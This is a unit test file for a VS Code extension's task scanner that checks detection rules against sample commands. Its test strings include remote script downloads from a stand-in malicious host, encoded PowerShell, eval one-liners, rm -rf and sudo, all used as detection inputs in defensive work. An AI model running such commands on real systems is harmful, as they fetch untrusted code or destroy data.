/**
 * Unit tests for TaskScanner (Task Analyzer)
 */

import { expect, use } from 'chai';
const sinon = require('sinon');
const sinonChai = require('sinon-chai');

use(sinonChai);

import { TaskScanner } from '../../monitor/analysis/task-anaylzer';
import { TASK_RULES, TaskRuleType } from '../../detection/task-rules';
import { TrustedWorkspaceService } from '../../lib/services/trusted-workspace-service';
import { IDEStatusService } from '../../lib/services/ide-status-service';
import { SidebarService } from '../../lib/services/sidebar-service';
import { NotificationService } from '../../lib/services/notification-service';
import { Logger } from '../../lib/logger';
import {
  createMockExtensionContext,
  createMockTask,
  createMockTaskExecution,
  createMockShellExecution,
  createMockProcessExecution,
  createMockWorkspaceInfo,
} from '../test-utils';
import * as vscode from 'vscode';

suite('TaskScanner Tests', () => {
  let scanner: TaskScanner;
  let mockContext: any;
  let trustedWorkspaceStub: sinon.SinonStub;
  let emitSecurityEventStub: sinon.SinonStub;
  let sidebarAddTaskEventStub: sinon.SinonStub;
  let sidebarUpdateTaskEventStub: sinon.SinonStub;
  let showSecurityBlockingInfoStub: sinon.SinonStub;
  let loggerInfoStub: sinon.SinonStub;
  let loggerWarnStub: sinon.SinonStub;
  let workspaceStub: any;

  setup(() => {
    // Create new scanner for each test (to avoid tests failing due to duplicate command registration)
    scanner = new TaskScanner();
    mockContext = createMockExtensionContext();

    // Mock TrustedWorkspaceService
    const mockTrustedService = { isTrusted: sinon.stub().returns(false) };
    trustedWorkspaceStub = sinon.stub(TrustedWorkspaceService, 'getInstance').returns(mockTrustedService as any);

    // Mock IDEStatusService
    emitSecurityEventStub = sinon.stub(IDEStatusService, 'emitSecurityEvent').resolves();

    // Mock SidebarService
    const mockSidebarService = { addTaskEvent: sinon.stub(), updateTaskEvent: sinon.stub() };
    sidebarAddTaskEventStub = mockSidebarService.addTaskEvent;
    sidebarUpdateTaskEventStub = mockSidebarService.updateTaskEvent;
    sinon.stub(SidebarService, 'getInstance').returns(mockSidebarService as any);

    // Mock NotificationService
    showSecurityBlockingInfoStub = sinon.stub(NotificationService, 'showSecurityBlockingInfo').resolves();

    // Mock Logger
    loggerInfoStub = sinon.stub(Logger, 'info');
    loggerWarnStub = sinon.stub(Logger, 'warn');
    sinon.stub(Logger, 'error');

    // Mock vscode.workspace
    workspaceStub = {
      name: 'test-workspace',
      workspaceFolders: [{ uri: { fsPath: '/mock/workspace' }, name: 'test-workspace', index: 0 }],
    };
  });

  teardown(() => {
    sinon.restore();
  });

  suite('Activation', () => {
    test('should create TaskScanner instance', () => {
      const freshScanner = new TaskScanner();
      expect(freshScanner).to.exist;
    });
  });

  suite('Task Analysis - Benign Tasks', () => {
    test('should allow benign npm install task', async () => {
      const task = createMockTask({ name: 'npm install', execution: createMockShellExecution('npm install') });
      const execution = createMockTaskExecution(task);

      const taskStartEvent: any = { execution };

      expect(execution.terminate).to.not.have.been.called;
    });

    test('should allow benign build task', async () => {
      const task = createMockTask({ name: 'build', execution: createMockShellExecution('tsc', ['-p', '.']) });
      const execution = createMockTaskExecution(task);

      // Test without activation
      expect(execution.terminate).to.not.have.been.called;
    });
  });

  suite('Task Analysis - Suspicious Network Tasks', () => {
    test('should detect curl download task', async () => {
      const curlRule = TASK_RULES.find((r) => r.id === 'task_curl_download');
      expect(curlRule).to.exist;
      expect(curlRule!.commandPattern.test('curl http://malicious.com/script.sh')).to.be.true;
    });

    test('should detect wget download task', async () => {
      const wgetRule = TASK_RULES.find((r) => r.id === 'task_wget_download');
      expect(wgetRule).to.exist;
      expect(wgetRule!.commandPattern.test('wget http://example.com/file')).to.be.true;
    });

    test('should match curl with https', () => {
      const curlRule = TASK_RULES.find((r) => r.id === 'task_curl_download');
      expect(curlRule!.commandPattern.test('curl https://example.com')).to.be.true;
    });
  });

  suite('Task Analysis - Encoded Commands', () => {
    test('should detect PowerShell encoded command', () => {
      const psRule = TASK_RULES.find((r) => r.id === 'task_powershell_encoded');
      expect(psRule).to.exist;
      expect(psRule!.commandPattern.test('powershell -enc BASE64STRING')).to.be.true;
    });

    test('should detect base64 decode', () => {
      const base64Rule = TASK_RULES.find((r) => r.id === 'task_base64_decode');
      expect(base64Rule).to.exist;
      expect(base64Rule!.commandPattern.test('echo DATA | base64 decode')).to.be.true;
    });

    test('should detect eval usage', () => {
      const evalRule = TASK_RULES.find((r) => r.id === 'task_eval');
      expect(evalRule).to.exist;
      expect(evalRule!.commandPattern.test('node -e "eval(code)"')).to.be.true;
    });
  });

  suite('Task Analysis - Destructive Operations', () => {
    test('should detect rm -rf command', () => {
      const rmRule = TASK_RULES.find((r) => r.id === 'task_rm_rf');
      expect(rmRule).to.exist;
      expect(rmRule!.commandPattern.test('rm -rf /important/data')).to.be.true;
    });

    test('should be case insensitive for destructive commands', () => {
      const rmRule = TASK_RULES.find((r) => r.id === 'task_rm_rf');
      expect(rmRule!.commandPattern.test('RM -RF /data')).to.be.true;
    });
  });

  suite('Task Analysis - Privilege Escalation', () => {
    test('should detect chmod +x command', () => {
      const chmodRule = TASK_RULES.find((r) => r.id === 'task_chmod_executable');
      expect(chmodRule).to.exist;
      expect(chmodRule!.commandPattern.test('chmod +x script.sh')).to.be.true;
    });

    test('should detect sudo usage', () => {
      const sudoRule = TASK_RULES.find((r) => r.id === 'task_sudo');
      expect(sudoRule).to.exist;
      expect(sudoRule!.commandPattern.test('sudo apt install malware')).to.be.true;
    });

    test('should be case insensitive for sudo', () => {
      const sudoRule = TASK_RULES.find((r) => r.id === 'task_sudo');
      expect(sudoRule!.commandPattern.test('SUDO command')).to.be.true;
    });
  });

  suite('Task Analysis - Remote Script Execution', () => {
    test('should detect temp directory script execution', () => {
      const tempRule = TASK_RULES.find((r) => r.id === 'task_temp_script');
      expect(tempRule).to.exist;
      expect(tempRule!.commandPattern.test('/tmp/malicious.sh')).to.be.true;
    });

    test('should be case insensitive for temp scripts', () => {
      const tempRule = TASK_RULES.find((r) => r.id === 'task_temp_script');
      expect(tempRule!.commandPattern.test('/TMP/script.SH')).to.be.true;
    });
  });

  suite('Trusted Workspace Integration', () => {
    test('should check trusted workspace status', async () => {
      const mockTrustedService = TrustedWorkspaceService.getInstance() as any;
      mockTrustedService.isTrusted.returns(false);

      const curlRule = TASK_RULES.find((r) => r.id === 'task_curl_download');
      expect(curlRule).to.exist;

      // Rule should still match even if workspace is not trusted
      expect(curlRule!.commandPattern.test('curl http://test.com')).to.be.true;
    });

    test('should allow suspicious tasks in trusted workspace', () => {
      const mockTrustedService = TrustedWorkspaceService.getInstance() as any;
      mockTrustedService.isTrusted.returns(true);

      // Task should be allowed in trusted workspace (tested via integration)
      expect(mockTrustedService.isTrusted('/mock/workspace')).to.be.true;
    });

    test('should block suspicious tasks in untrusted workspace', () => {
      const mockTrustedService = TrustedWorkspaceService.getInstance() as any;
      mockTrustedService.isTrusted.returns(false);

      expect(mockTrustedService.isTrusted('/mock/workspace')).to.be.false;
    });
  });

  suite('Command Extraction', () => {
    test('should extract command from ShellExecution with commandLine', () => {
      const task = createMockTask({ name: 'test', execution: createMockShellExecution('curl http://test.com') });

      expect(task.execution.commandLine).to.equal('curl http://test.com');
    });

    test('should extract command from ShellExecution with command and args', () => {
      const task = createMockTask({ name: 'test', execution: createMockShellExecution('curl', ['http://test.com']) });

      expect(task.execution.command).to.equal('curl');
      expect(task.execution.args).to.deep.equal(['http://test.com']);
    });

    test('should extract command from ProcessExecution', () => {
      const task = createMockTask({ name: 'test', execution: createMockProcessExecution('curl', ['http://test.com']) });

      expect(task.execution.process).to.equal('curl');
      expect(task.execution.args).to.deep.equal(['http://test.com']);
    });
  });

  suite('Task Rule Quality', () => {
    test('should have rules defined', () => {
      expect(TASK_RULES).to.be.an('array');
      expect(TASK_RULES.length).to.be.greaterThan(0);
    });

    test('all rules should have required properties', () => {
      TASK_RULES.forEach((rule) => {
        expect(rule.id).to.be.a('string');
        expect(rule.name).to.be.a('string');
        expect(rule.description).to.be.a('string');
        expect(rule.type).to.exist;
        expect(rule.severity).to.exist;
        expect(rule.commandPattern).to.be.instanceOf(RegExp);
        expect(rule.confidence).to.be.a('number');
        expect(rule.confidence).to.be.at.least(0);
        expect(rule.confidence).to.be.at.most(1);
      });
    });

    test('all rules should have unique IDs', () => {
      const ids = TASK_RULES.map((r) => r.id);
      const uniqueIds = new Set(ids);
      expect(uniqueIds.size).to.equal(ids.length);
    });

    test('should have rules for each TaskRuleType', () => {
      const types = Object.values(TaskRuleType);
      types.forEach((type) => {
        const rulesOfType = TASK_RULES.filter((r) => r.type === type);
        expect(rulesOfType.length).to.be.greaterThan(0, `No rules found for type: ${type}`);
      });
    });
  });

  suite('Security Event Creation', () => {
    test('should include task information in security event', () => {
      const curlRule = TASK_RULES.find((r) => r.id === 'task_curl_download');
      expect(curlRule).to.exist;

      const command = 'curl http://malicious.com/payload.sh';
      expect(curlRule!.commandPattern.test(command)).to.be.true;
    });

    test('should include rule information in IoC', () => {
      const sudoRule = TASK_RULES.find((r) => r.id === 'task_sudo');
      expect(sudoRule).to.exist;
      expect(sudoRule!.name).to.equal('Task: Sudo Execution');
      expect(sudoRule!.description).to.include('sudo');
    });
  });

  suite('Task Timeline Integration', () => {
    test('should verify sidebar service stub is configured', () => {
      // Sidebar service stub was configured in setup
      const sidebarInstance = SidebarService.getInstance();
      expect(sidebarInstance).to.exist;
      expect(sidebarInstance.addTaskEvent).to.be.a('function');
      expect(sidebarInstance.updateTaskEvent).to.be.a('function');
    });
  });

  suite('Error Handling', () => {
    test('should handle missing task execution gracefully', () => {
      const task = createMockTask({ name: 'test', execution: null });

      // Should not throw error
      expect(() => {
        const taskId = `${task.source}_${task.name}_${task.definition.type}`;
      }).to.not.throw();
    });

    test('should handle emitSecurityEvent failure', async () => {
      emitSecurityEventStub.rejects(new Error('Emit failed'));

      // Should not throw even if emit fails
      const curlRule = TASK_RULES.find((r) => r.id === 'task_curl_download');
      expect(curlRule).to.exist;
    });
  });

  suite('Task Scope Handling', () => {
    test('should handle Global scope', () => {
      const task = createMockTask({ name: 'global-task', scope: vscode.TaskScope.Global });

      expect(task.scope).to.equal(vscode.TaskScope.Global);
    });

    test('should handle Workspace scope', () => {
      const task = createMockTask({ name: 'workspace-task', scope: vscode.TaskScope.Workspace });

      expect(task.scope).to.equal(vscode.TaskScope.Workspace);
    });

    test('should handle WorkspaceFolder scope', () => {
      const workspaceFolder = { uri: { fsPath: '/mock/workspace' }, name: 'test-workspace', index: 0 };
      const task = createMockTask({ name: 'folder-task', scope: workspaceFolder });

      expect(task.scope).to.deep.equal(workspaceFolder);
    });
  });

  suite('Multiple Task Management', () => {
    test('should track multiple active tasks', () => {
      const task1 = createMockTask({ name: 'task1' });
      const task2 = createMockTask({ name: 'task2' });

      const exec1 = createMockTaskExecution(task1);
      const exec2 = createMockTaskExecution(task2);

      expect(task1.name).to.equal('task1');
      expect(task2.name).to.equal('task2');
    });

    test('should log warning on emergency stop', () => {
      // Call terminateAllTasks without activation (avoid duplicate command registration)
      scanner.terminateAllTasks();

      // Should log warning about emergency termination
      expect(loggerWarnStub).to.have.been.calledWith('EMERGENCY: Terminating all active tasks');
    });
  });

  suite('Rule Pattern Edge Cases', () => {
    test('curl rule should not match curl without http', () => {
      const curlRule = TASK_RULES.find((r) => r.id === 'task_curl_download');
      expect(curlRule!.commandPattern.test('curl --version')).to.be.false;
    });

    test('should match eval with different contexts', () => {
      const evalRule = TASK_RULES.find((r) => r.id === 'task_eval');
      expect(evalRule!.commandPattern.test('python -c "eval(code)"')).to.be.true;
      expect(evalRule!.commandPattern.test('ruby -e "eval(input)"')).to.be.true;
    });

    test('rm -rf should require both flags', () => {
      const rmRule = TASK_RULES.find((r) => r.id === 'task_rm_rf');
      expect(rmRule!.commandPattern.test('rm -r folder')).to.be.false;
      expect(rmRule!.commandPattern.test('rm -f file')).to.be.false;
      expect(rmRule!.commandPattern.test('rm -rf folder')).to.be.true;
    });

    test('chmod should require +x specifically', () => {
      const chmodRule = TASK_RULES.find((r) => r.id === 'task_chmod_executable');
      expect(chmodRule!.commandPattern.test('chmod 644 file')).to.be.false;
      expect(chmodRule!.commandPattern.test('chmod +x file')).to.be.true;
    });
  });
});
